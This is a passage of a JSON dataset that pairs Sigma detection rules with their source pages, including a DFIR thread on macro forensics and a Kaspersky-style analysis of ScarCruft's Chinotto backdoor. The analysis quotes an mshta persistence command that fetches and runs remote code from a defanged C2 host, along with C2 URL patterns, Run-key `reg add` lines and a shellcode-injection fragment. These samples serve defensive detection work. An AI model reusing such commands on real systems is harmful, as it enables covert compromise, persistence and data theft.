`2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18`\n- `38f2c86041e0446730479cdb9c530298c0c4936722975c4e7446544fd6dcac9f`\n- `67c4e8ab0f12fae7b4aeb66f7e59e286bd98d3a77e5a291e8d58b3cfbc1514ed`\n- `9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba`",
    "sigma_rule": {
      "title": "Internet Explorer DisableFirstRunCustomize Enabled",
      "id": "ab567429-1dfb-4674-b6d2-979fd2f9d125",
      "status": "test",
      "description": "Detects changes to the Internet Explorer \"DisableFirstRunCustomize\" value, which prevents Internet Explorer from running the first run wizard the first time a user starts the browser after installing Internet Explorer or Windows.\n",
      "references": [
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf",
        "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
        "https://admx.help/?Category=InternetExplorer&Policy=Microsoft.Policies.InternetExplorer::NoFirstRunCustomise"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-16",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize",
          "Details": [
            "DWORD (0x00000001)",
            "DWORD (0x00000002)"
          ]
        },
        "filter_main_generic": {
          "Image": [
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\ie4uinit.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "As this is controlled by group policy as well as user settings. Some false positives may occur."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_internet_explorer_disable_first_run_customize.yml",
    "id": "968"
  },
  {
    "url": "https://admx.help/?Category=InternetExplorer&Policy=Microsoft.Policies.InternetExplorer::NoFirstRunCustomise",
    "markdown": "",
    "sigma_rule": {
      "title": "Internet Explorer DisableFirstRunCustomize Enabled",
      "id": "ab567429-1dfb-4674-b6d2-979fd2f9d125",
      "status": "test",
      "description": "Detects changes to the Internet Explorer \"DisableFirstRunCustomize\" value, which prevents Internet Explorer from running the first run wizard the first time a user starts the browser after installing Internet Explorer or Windows.\n",
      "references": [
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf",
        "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
        "https://admx.help/?Category=InternetExplorer&Policy=Microsoft.Policies.InternetExplorer::NoFirstRunCustomise"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-16",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize",
          "Details": [
            "DWORD (0x00000001)",
            "DWORD (0x00000002)"
          ]
        },
        "filter_main_generic": {
          "Image": [
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\ie4uinit.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "As this is controlled by group policy as well as user settings. Some false positives may occur."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_internet_explorer_disable_first_run_customize.yml",
    "id": "969"
  },
  {
    "url": "https://twitter.com/inversecos/status/1494174785621819397",
    "markdown": "# Post\n\nFeb 17, 2022\n\n1\\ How to prove malicious macro was enabled & clicked? 👀 #DFIR \n\nHKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\<VERS>\\<PROGRAM>\\Security\\Trusted Documents\\TrustRecords \n\nLook ONLY for values where last four bytes are \"FF FF FF 7F\". \n\nThese files had macros enabled\n\n👇👇👇\n\n\n```image\nDescription: The image shows a screenshot of the Windows Registry Editor, specifically focusing on the path related to Microsoft Office's security settings for trusted documents. It highlights the 'TrustRecords' section, with various registry entries displayed. The relevant entries are marked with red boxes, indicating that the last four bytes of certain values are 'FF FF FF 7F', which signifies that macros were enabled for those files. This visual serves as a technical reference for identifying enabled macros in malicious documents.\nTranscription: |\n  Registry Editor\n  Computer\\HKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\Trusted Documents\\TrustRecords\n  \n  Name            Type        Data\n  (Default)       REG_SZ      (value not set)\n  Entry 1         REG_BINARY  80 eb 71 c9 01 b5 d7 01 00 a8 e7 6f 4b 00 00 00 bb da a1 01 ff ff ff 7f\n  Entry 2         REG_BINARY  80 5a 37 44 a5 02 d8 01 00 a8 e7 6f 4b 00 00 00 ae fc a1 01 ff ff ff 7f\n  Entry 3         REG_BINARY  d0 35 82 b5 55 a3 d6 01 00 a8 e7 6f 4b 00 00 00 b0 9d 9d 01 ff ff ff 7f\n  Entry 4         REG_BINARY  2a 58 1f 2f de 62 d7 01 00 a8 e7 6f 4b 00 00 00 9d 9d 01 ff ff ff 7f\n  Entry 5         REG_BINARY  2c e0 a4 4e aa 4a d7 01 00 a8 e7 6f 4b 00 00 00 fd 5d c9 01 ff ff ff 7f\n```\n\n## Comment\n\nFeb 17, 2022\n\n2\\ In light of the recent Emotet campaigns, make sure you check INetCache Outlook folder as it stores the attachments that were opened in Outlook. \n\nIf AV quarantines the file this wont exist.\n\nC:\\Users\\<name>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\<Folder>\\\n\n## Comment\n\nFeb 17, 2022\n\n3\\ Next check the macro settings for that user as this user had macros set to auto enabled (VBAWarnings=1)\n\nNTUSERDAT\\Software\\Microsoft\\Office\\<vers>\\<program>\\Security\n\nDisable all macros w/o notification : 2, 4\nDisable all macros except signed macros: 3\nEnable all macros: 1\n\n```image\nDescription: The image depicts a screenshot of the Windows Registry Editor displaying a path related to Microsoft Office security settings. Specifically, it shows the registry key for 'VBAWarnings' under 'HKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\15.0\\Excel\\Security'. The data associated with 'VBAWarnings' is shown as '0x00000001', indicating that macros are set to be enabled without notification. This information is relevant for understanding the macro settings that could impact security in Microsoft Excel.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\n  \n  Name: \n      (Default) \n      VBAWarnings\n  \n  Type: \n      REG_SZ \n      REG_DWORD\n  \n  Data: \n      (value not set) \n      0x00000001 (1)\n```\n\n## Comment\n\nFeb 17, 2022\n\n4\\ Next step is to check recent files viewed/visited... you can look at:\n\n> NTUSER.DAT artefacts\n> LNK / Jmplists\n> Microsoft Recent Files (C:\\Users\\<usr>\\appdata\\roaming\\Microsoft\\office\\Recent)\n\n## Comment\n\nFeb 17, 2022\n\n5\\ You can look for the OST/PST files but usually the INetCache covers this. You can look for this here \n\n%UserProfile%\\appdata\\local\\microsoft\\outlook\\\n\n## Comment\n\nFeb 17, 2022\n\n6\\ In terms of execution of word/excel/outlook ... just look at the usual execution artefacts. You can do this using Prefetch, Shimcache (amcache likely not too relevant if this is user workstation) etc.\n\nAnd also Security.evtx Event ID 4688 <3\n\n## Comment\n\nFeb 17, 2022\n\n7\\ This is awesome, hopefully they extend this to more than just Excel! \nhttps://bleepingcomputer.com/news/microsoft/microsoft-is-disabling-excel-40-macros-by-default-to-protect-users/#:~:text=Microsoft%20to%20disable%20Excel%204.0,the%20current%20channel%20in%20November.",
    "sigma_rule": {
      "title": "Trust Access Disable For VBApplications",
      "id": "1a5c46e9-f32f-42f7-b2bc-6e9084db7fbf",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"AccessVBOM\" to a value of \"1\" which disables trust access for VBA on the victim machine and lets attackers execute malicious macros without any Microsoft Office warnings.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\AccessVBOM",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_access_vbom_tamper.yml",
    "id": "973"
  },
  {
    "url": "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/",
    "markdown": "# ScarCruft surveilling North Korean defectors and human rights activists\n\n**APT reports** \n**29 Nov 2021** \n\nThe ScarCruft group (also known as APT37 or Temp.Reaper) is a nation-state sponsored APT actor we first reported in 2016. ScarCruft is known to target North Korean defectors, journalists who cover North Korea-related news, and government organizations related to the Korean Peninsula, among others. Recently, we were approached by a news organization with a request for technical assistance during their cybersecurity investigations. As a result, we had an opportunity to perform a deeper investigation on a host compromised by ScarCruft. The victim was infected by PowerShell malware, and we discovered evidence that the actor had already stolen data from the victim and had been surveilling this victim for several months. The actor also attempted to send spear-phishing emails to the victims’ associates working in businesses related to North Korea by using stolen login credentials.\n\nBased on the findings from the compromised machine, we discovered additional malware. The actor utilized three types of malware with similar functionalities: versions implemented in PowerShell, Windows executables, and Android applications. Although intended for different platforms, they share a similar command and control scheme based on HTTP communication. Therefore, the malware operators can control the whole malware family through one set of command and control scripts.\n\nWe were working closely with a local CERT to investigate the attacker’s command and control infrastructure, and as a result of this, we were able to better understand how it works. The APT operator controls the malware using a PHP script on the compromised web server and controls the implants based on the HTTP parameters. We were also able to acquire several log files from the compromised servers. Based on said files, we identified additional victims in South Korea and compromised web servers that have been utilized by ScarCruft since early 2021. Additionally, we discovered older variants of the malware, delivered via HWP documents, dating back to mid-2020.\n\nMore information about ScarCruft is available to customers of Kaspersky Intelligence Reporting. Contact: intelreports@kaspersky.com\n\n## Table of Contents\n\n- Spear-phishing document\n- Host investigation\n- Windows executable Chinotto\n- Android Chinotto\n- Older malicious HWP documents\n- Infrastructure\n  - ‘hello’ type\n  - ‘command’ type\n  - ‘result’ type\n  - ‘file’ type\n- Victims\n- Attribution\n- Conclusions\n- Indicators of compromise\n- MITRE ATT&CK mapping\n\n## Spear-phishing document\n\nBefore spear-phishing a potential victim and sending a malicious document, the actor contacted an acquaintance of the victim using the victim’s stolen Facebook account. The actor already knew that the potential target ran a business related to North Korea and asked about its current status. After a conversation on social media, the actor sent a spear-phishing email to the potential victim using a stolen email account. The actor leveraged their attacks using stolen login credentials, such as Facebook and personal email accounts, and thereby showed a high level of sophistication.\n\nAfter a Facebook conversation, the potential target received a spear-phishing email from the actor. It contains a password-protected RAR archive with the password shown in the email body. The RAR file contains a malicious Word document.\n\n```image\nAlt: Spear-phishing email and decoy\nDescription: The image depicts a spear-phishing email with a malicious attachment. It shows an email header stating the date and sender's details, along with a message in Korean that discusses a document titled 'North Korea's latest situation and our national security.' The email includes a password-protected RAR file as an attachment, and the password is explicitly mentioned in the email body. Additionally, there is a notification indicating that macros have been disabled in the attached document, implying a security warning related to potential risks from enabling macros.\nTranscription: |\n  Mon 9/6/2021 10:58 AM\n  \n  칼럼초안보내드립니다. Draft of column\n  \n  To\n  Message\n  북한의 최근 정세와 우리의 안보.rar (29 KB)\n  North Korea's latest situation and our national security.rar\n  \n  비밀번호는 12300이에요.\n  많은 조언 부탁드립니다~\n  The password is '123'.\n  Look forward to your advice.\n  \n  북한의 최근 정세와 우리의 안보\n  \n  ■ 북한 경제위기 심화\n  \n  김정은 위원장은 6월 17일 노동당 중앙위원회 제7기 제3차 전원회의에서 지난 1년 동안 “심각하게 진행되고 있다”고 독특하게 설명했다.\n  조선중앙통신은 위기상황이 특별하게 들고 있는 사태를 “인민경제의 정상화”를 미뤄두는 중요한 시점이라고 특별히 강조했다.\n  다만, 이러한 특별한 상황에서는 사람들의 생활이 개선되지 않고, 자급자족은 여전히 어려운 상황이라고 보도했다.\n```\n\n*__Spear-phishing email and decoy__*\n\nThis document contains a lure related to North Korea.\n\n| MD5                              | File name                                                                           | Modified time       | Author  | Last saved user |\n| -------------------------------- | ----------------------------------------------------------------------------------- | ------------------- | ------- | --------------- |\n| baa9b34f152076ecc4e01e35ecc2de18 | 북한의 최근 정세와 우리의 안보.doc (North Korea’s latest situation and our national security) | 2021-09-03 09:34:00 | Leopard | Cloud           |\n\nThis document contains a malicious macro and a payload for a multi-stage infection process. The first stage’s macro contains obfuscated strings and then spawns another macro as a second stage.\n\nThe first stage macro checks for the presence of a Kaspersky security solution on the victim’s machine by trying the following file paths:\n\n- `C:\\Windows\\avp.exe` # Kaspersky AV\n- `C:\\Windows\\Kavsvc.exe` # Kaspersky AV\n- `C:\\Windows\\clisve.exe` # Unknown\n\nIf a Kaspersky security solution is indeed installed on the system, it enables trust access for Visual Basic Application (VBA) by setting the following registry key to ‘1’:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\[Application.Version]\\Word\\Security\\AccessVBOM\n```\n\nBy doing so, Microsoft Office will trust all macros and run any code without showing a security warning or requiring the user’s permission. Next, the macro creates a mutex named ‘​​sensiblemtv16n’ and opens the malicious file once more. Thanks to the “trust all macros” setting, the macro will be executed automatically.\n\nIf no Kaspersky security software is installed, the macro directly proceeds to decrypt the next stage’s payload. In order to achieve this, it uses a variation of a substitution method. The script compares the given encrypted string with a second string to get an index of matched characters. Next, it receives a decrypted character with an index acquired from the first string.\n\n- First string: `BU+13r7JX9A)dwxvD5h2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V&tC,uYz=Z0RS8aM4Fqn`\n- Second string: `v&tC,uYz=Z0RS8aM4FqnD5h2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V7JX9A)dwxBU+13r`\n\nThe decrypted second stage Visual Basic Application (VBA) contains shellcode as a hex string. This script is responsible for injecting the shellcode into the process `notepad.exe`.\n\n```image\nAlt: Shellcode in the second stage VBA\nDescription: The image displays a snippet of Visual Basic for Applications (VBA) code, which is part of a malicious macro. The code includes constants for configuring window visibility and process access, alongside an array that appears to represent encrypted shellcode. The formatting highlights different elements of the code with color coding, indicating a programming environment. This malicious code is related to a multi-stage infection process used in a spear-phishing attack targeting North Korean defectors and human rights activists.\nTranscription: |\n  Sub main()\n  Const STARTF_USESHOWWINDOW = &H1\n  Const SW_SHOW = 5\n  Const SW_HIDE = 0\n  Const PROCESS_ALL_ACCESS = &H1F0FFF\n  Const MEM_COMMIT = &H1000\n  Const MEM_RESERVE = &H2000\n  Const MEM_RESET = &H8000\n  Const PAGE_EXECUTE_READWRITE = &H40\n  Dim proc As PROCESS_INFORMATION\n  Dim PID As Long\n  Dim src_str As Variant\n  src_str = Array(&H55, &H8B, &HEC, &H83, &C4, &H4, &H8B, ...\n```\n\n*__Shellcode in the second stage VBA__*\n\nThe shellcode contains the URL to fetch the next stage payload. After fetching the payload, the shellcode decrypts it with trivial single-byte XOR decryption. Unfortunately, we weren’t able to gather the final payload when we investigated this sample.\n\nThe payload’s download path is:\n\n```\nhxxps://api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalVyZDlodU1wUWNjTGt4bXhBV0pjQU1ja2M_ZT1mUnc4VHg/root/content\n```\n\n## Host investigation\n\nAs a result of our efforts in helping the victim with the analysis, we had a chance to investigate the host of the owner who sent the spear-phishing email. When we first checked the process list, there was a suspicious PowerShell process running with a rather suspicious parameter.\n\nThis PowerShell command was registered via the Run registry key as a mechanism for persistence:\n\n- Registry path: `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run – ONEGO`\n\n```\nc:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 300000 2.2.2.2 || mshta hxxp://[redacted].cafe24[.]com/bbs/probook/1.html\n```\n\nThis registry key causes the HTML Application (HTA) file to get fetched and executed by the `mshta.exe` process every time the system is booted. The fetched ‘1.html’ is an HTML Application (.hta) file that contains Visual Basic Script (VBS), which eventually executes PowerShell commands.\n\nThe PowerShell script offers simple backdoor functionalities and continuously queries the C2 server with HTTP POST requests containing several parameters. At first, it sends a beacon to the C2 server with the host name:\n\n```\nhxxp://[redacted].cafe24[.]com/bbs/probook/do.php?type=hello&direction=send&id=[host name]\n```\n\nNext, it attempts to download commands from the C2 server with the following format:\n\n```\nhxxp://[redacted].cafe24[.]com/bbs/probook/do.php??type=command&direction=receive&id=\n```\n\nIf the HTTP response from the C2 server is 200, it checks the response data and executes the delivered commands.\n\n| Delivered data | Description                                                                                                                                                                                                                                                                                                                                                          |\n| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| ref:           | Send a beacon to the C2 server: HTTP request: `?type=hello&direction=send&id=`                                                                                                                                                                                                                                                                                       |\n| cmd:           | If the command data includes ‘start’, execute the given command with `cmd.exe` and send base64 encoded ‘OK’ with the following POST format. Otherwise, it executes the given command, redirecting the result to the result file (`%APPDATA%\\desktop.dat`), and sends the contents of the file after base64 encoding. HTTP request: `?type=result&direction=send&id=` |\n\nWe discovered additional malware, tools, and stolen files from the victim’s host. Due to limited access to the compromised host, we were unable to figure out the initial infection vector. However, we assess this host was compromised on March 22, 2021, based on the timestamp of the suspicious files. One characteristic of the malware we discovered from the victim is the writing of execution results from commands to the file `%appdata%\\desktop.dat`. According to the Master File Table (MFT) information, this file was created the same day, March 22, 2021, and the last modification time is on September 8, 2021, which means this file was used until just before our investigation.\n\nUsing the additional tools, the malware operator collected sensitive information from this victim, although we can’t assess exactly how much data was exfiltrated and what kind of data was stolen. Based on the timestamp of the folders and files created by the malware, the actor collected and exfiltrated files as early as August 2021. The log files with the `.dat` extension are encrypted, but can be decrypted with the one-byte XOR key `0x75`. These log files contain the uploading history. We found two log files and each of them contains slightly different logs. The `B14yNKWdROad6DDeFxkxPZpsUmb.dat` file contains zipping and uploading of the folder bearing the same name. The log file presents the process as: “Zip Dir Start > Up Init > Up Start > Up File Succeed > Zip Dir Succeed”. According to the log file, the malware operator collected something from the infected system in this folder and uploaded it after archiving.\n\n```image\nAlt: File archiving and uploading log\nDescription: The image displays a text log of activities related to file archiving and uploading by malware. It includes entries such as 'Zip Dir Start', 'Up Init', 'Up Start', 'Up File Succeed', and 'Zip Dir Succeed', along with specific file paths indicating the locations of the archived files on the compromised system. The formatting suggests a chronological account of operations performed by the malware during its data exfiltration process.\nTranscription: |\n  Zip Dir Start - g:\\»çáµé\n  Up Init - C:\\Users\\\n      \\AppData\\Roaming\\B14yNKWdROad6DDeFxkxPZpsUmb\\e_hjjjpXahBJ\n  Up Start - C:\\Users\\\n      \\AppData\\Roaming\\B14yNKWdROad6DDeFxkxPZpsUmb\\e_hjjjpXahBJ\n  Up File Succeed - C:\\Users\\\n      \\AppData\\Roaming\\B14yNKWdROad6DDeFxkxPZpsUmb\\e_hjjjpXahBJ\n  Zip Dir Succeed - g:\\»çáµé\n```\n\n*__File archiving and uploading log__*\n\nThe other log file, named `s5gRAEs70xTHkAdUjl_DY1fD.dat`, also contains a file uploading history, except for file zipping messages. It processes each file with this procedure: “Up Init > Up Start > Up File Succeed”.\n\n```image\nAlt: File uploading log\nDescription: The image displays a log of file uploading activities from a compromised host, detailing the sequential steps of file initialization, starting the upload process, and the successful completion of file uploads. The logs indicate the file paths within the user's AppData directory, specifically referencing files with names like 's5gRAEs70xTHkAdUjl_DY1fD.e_PR9H4c4x7a' and 's5gRAEs70xTHkAdUjl_DY1fD.e_NxVs08wMuQ'. This log is likely part of an analysis of malware behavior related to data exfiltration.\nTranscription: |\n  Up Init – C:\\Users\\\n  Up Start – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_PR9H4c4x7a\n  Up File Succeed – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_PR9H4c4x7a\n  Up Init – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_NxVs08wMuQ\n  Up Start – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_NxVs08wMuQ\n  Up File Succeed – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_NxVs08wMuQ\n```\n\n*__File uploading log__*\n\nBased on what we found from this victim, we can confirm that the malware operator collected screenshots and exfiltrated them between August 6, 2021, and September 8, 2021. Based on what we found out from the victim, we can summarize the whole infection timeline. We suspect this host was compromised on March 22, 2021. After the initial infection, the actor attempted to implant additional malware, but an error occurred that led to the crash of the malware. The malware operator later delivered the Chinotto malware in August 2021 and probably started to exfiltrate sensitive data from the victim.\n\n```image\nAlt: Timeline of the attack on the victim\nDescription: The image is a timeline chart detailing the sequence of events related to a cyber attack on a victim from March 22, 2021, to September 8, 2021. It includes specific dates and actions such as the creation of log files, the first crash reports of malware, the creation of folders for screenshots, and modifications to log files. Each event is chronologically arranged along a horizontal line, illustrating the progression and key milestones of the attack.\nTranscription: |\n  2021-03-22\n  Create a log file (%appdata%\\desktop.dat)\n  \n  2021-04-06\n  First crash report of anhwp.exe\n  \n  2021-04-23\n  Create working directory (%appdata%\\RoamedYKIIDl6Q_mhL_Mm/)\n  \n  2021-05-05\n  First crash report of anprotect5.exe\n  \n  2021-07-16\n  Create VPN server file (tvnserver.exe)\n  \n  2021-09-05\n  Create a log file (%appdata%\\B14yNKWdRoADdDEfKxkPZ5Umb.dat)\n  \n  2021-09-08\n  Last modification of file upload log (s5gRAEs70xTHkAdUjI_DY1fD.dat)\n  Last modification of backdoor log file (desktop.dat)\n  \n  2021-08-31\n  Create Chinotto malware (%appdata%\\anprotect5.exe)\n  Create the first screenshot file\n  \n  2021-08-06\n  Create Chinotto malware (%appdata%\\alyakscan.exe)\n  Create a folder for screenshot (%appdata%\\s5gRAEs70xTHkAdUjI_DY1fD)\n  Create a log file (%appdata%\\s5gRAEs70xTHkAdUjI_DY1fD.dat)\n```\n\n*__Timeline of the attack on the victim__*\n\n## Windows executable Chinotto\n\nAs a result of the host investigation, we discovered a malicious Windows executable and found additional malware variants from VirusTotal and our own sample collection. One of the Windows executables contains a build path and the malware author appears to call the malware “Chinotto)”.\n\n```image\nAlt: PDB path\nDescription: The image displays a screenshot of a code snippet, likely extracted from a debugging or forensic analysis tool. The prominent text highlighted in red is a file path: 'D:\\Workspace\\chinotto\\Release\\Chinotto.pdb', which indicates a Program Database (PDB) file related to the Chinotto malware. The rest of the image contains various characters and symbols that may represent additional code or data, but the focus is on the PDB path, which is relevant for understanding the structure and debugging of the malware.\nTranscription: |\n  error</h>\n  LIA ♥ RSDS+¢ <%C3H6-;W\n  D:\\USWorkspace\\chinotto\\Release\\Chinotto.pdb\n```\n\n*__PDB path__*\n\nThe technical specifications in this analysis are based on the Chinotto malware (MD5 00df5bbac9ad059c441e8fef9fefc3c1) we discovered from the host investigation. One of the characteristics of this malware is that it contains a lot of garbage code to impede analysis. During runtime, the malware copies unused data to the allocated buffer before copying the real value; or allocates an unused buffer, filling it with meaningless data, and never uses it.\n\nIt also restores functional strings such as C2 addresses and debugging messages to the stack at runtime. The malware creates a mutex and fetches the C2 addresses, which are different for each sample we discovered:\n\n```\nMutex: NxaNnkHnJiNAuDCcoCKRAngjHVUZG2hSZL03pw8Y\nC2 address: hxxp://luminix.openhaja[.]com/bbs/data/proc1/proc.php\n```\n\nIn order to generate the identification value of the victim, the malware acquires both computer and user name and combines them in the format ‘%computer name%_%user name%’. Next, it encrypts the acquired string with the XOR key ‘YFXAWSAEAXee12D4’ and encodes it with base64.\n\nThe backdoor continuously queries the C2 server, awaiting commands from the malware operator. We observed an early version of Chinotto malware (MD5 55afe67b0cd4a01f3a9a6621c26b1a49) which, while it also follows this simple principle, uses a hard-coded backdoor command ‘scap’. This means this specific sample is only designed for exfiltrating the victim’s screenshot.\n\nThe Chinotto malware shows fully fledged capabilities to control and exfiltrate sensitive information from the victims.\n\n| Command    | Description                                                                                                                                                                                                                                                                                                                                                                         |\n| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| ref:       | Send beacon to the C2 server: `http://[C2 URL]?ref=id=%s&type=hello&direction=send`                                                                                                                                                                                                                                                                                                 |\n| cmd:       | Execute Windows commands and save the result to the `%APPDATA%\\s5gRAEs70xTHkAdUjl_DY1f.dat` file after encrypting with a one-byte XOR key                                                                                                                                                                                                                                           |\n| down:      | Download file from the remote server                                                                                                                                                                                                                                                                                                                                                |\n| up:        | Upload file                                                                                                                                                                                                                                                                                                                                                                         |\n| state:     | Upload log file (`s5gRAEs70xTHkAdUjl_DY1fD.dat`)                                                                                                                                                                                                                                                                                                                                    |\n| regstart:  | Copy current malware to the ​​CSIDL_COMMON_DOCUMENTS folder and execute command to register file to run registry: `reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v a2McCq /t REG_SZ /d %s /f`                                                                                                                                                      |\n| cleartemp: | Remove files from folder `%APPDATA%\\s5gRAEs70xTHkAdUjl_DY1fD`                                                                                                                                                                                                                                                                                                                       |\n| updir:     | Archive directory and upload it. Archive is XOR encoded using the same key used when creating the identification value: ‘YFXAWSAEAXee12D4’                                                                                                                                                                                                                                          |\n| init:      | Collect files with following extensions from the paths CSIDL_DESKTOP, CSIDL_PERSONAL(CSIDL_MYDOCUMENTS), CSIDL_MYMUSIC, CSIDL_MYVIDEO. Downloads and upload them to C2 server: `jpg | jpeg | png | gif | bmp | hwp | doc | docx | xls | xlsx | xlsm | ppt | pptx | pdf | txt | mp3 | amr | m4a | ogg | aac | wav | wma | 3gpp | eml | lnk | zip | rar | egg | alz | 7z | vcf | 3gp` |\n| scap:      | Take a screenshot, save it to the folder `%appdata%\\s5gRAEs70xTHkAdUjl_DY1fD` in an archived format. The file to store the screenshot has an ‘e_’ prefix and 10 randomly generated characters as a filename. When uploading the screenshot file, it uses ‘wrpdwRwsFEse’ as the filename                                                                                             |\n| run:       | Run Windows commands with ShellExecuteW API                                                                                                                                                                                                                                                                                                                                         |\n| chdec:     | Download an encrypted file and decrypt it via CryptUnprotectData API                                                                                                                                                                                                                                                                                                                |\n| update:    | Download updated malware and register it: `reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v m4cVWKDsa9WxAWr41iaNGR /t REG_SZ /d %s /f`                                                                                                                                                                                                                    |\n| wait:      | Sleep for 30 minutes                                                                                                                                                                                                                                                                                                                                                                |\n| wakeup:    | Wake up after 2.5 seconds                                                                                                                                                                                                                                                                                                                                                           |\n\nAnother malware sample (MD5 04ddb77e44ac13c78d6cb304d71e2b86) that demonstrated a slight difference during runtime was discovered from the same victim. This is the same fully featured backdoor, but it loads the backdoor command using a different scheme. The malware checks for the existence of a ‘*.zbpiz’ file in the same folder. If it exists, it loads the file’s content and uses it as a backdoor command after decrypting. The malware authors keep changing the capabilities of the malware to evade detection and create custom variants depending on the victim’s scenario.\n\nIn addition, there are different Windows executable variants of the Chinotto malware. Apart from the conventional Chinotto malware mentioned above, a different variant contains an embedded PowerShell script. The spawned PowerShell command has similar functionality to the PowerShell we found from the victim. However, it contains additional backdoor commands, such as uploading and downloading capabilities. Based on the build timestamp of the malware, we assess that the malware author used the PowerShell embedded version from mid-2019 to mid-2020 and started to use the malicious, PowerShell-less Windows executable from the end of 2020 onward.\n\n## Android Chinotto\n\nBased on the C2 communication pattern, we discovered an Android application version of Chinotto malware (MD5 56f3d2bcf67cf9f7b7d16ce8a5f8140a). This malicious APK requests excessive permissions according to the AndroidManifest.xml file. To achieve its purpose of spying on the user, these apps ask users to enable various sorts of permissions. Granting these permissions allows the apps to collect sensitive information, including contacts, messages, call logs, device information, and audio recordings. Each sample has a different package name, with the analyzed sample bearing “com.secure.protect” as a package name.\n\nThe malware sends its unique device ID in the same format as the Windows executable version of Chinotto.\n\n```\nBeacon URI pattern: [C2 url]?type=hello&direction=send&id=[Unique Device ID]\n```\n\nNext, it receives a command after the following HTTP request:\n\n```\nRetrieve commands: [C2 url]?type=command&direction=receive&id=[Unique Device ID]\n```\n\nIf the delivered data from the C2 server is not “ERROR” or “Fail”, the malware starts to carry out backdoor operations.\n\n| Command    | URI pattern                                                         | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| ---------- | ------------------------------------------------------------------- ||\n| ref:       | `?type=hello&direction=send&id=`                                    | Send the same beacon request to the C2 server                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| down       | `?type=file&direction=send&id=`                                     | Upload the temporary file (`/sdcard/.temp-file.dat`) to the C2 server and remove it from local storage.                                                                                                                                                                                                                                                                                                                                                                                                                                                      |\n| UriP       | `?type=file&direction=send&id=`                                     | Save temporary file path to the result file (`/sdcard/result-file.dat`) and upload the temporary file.                                                                                                                                                                                                                                                                                           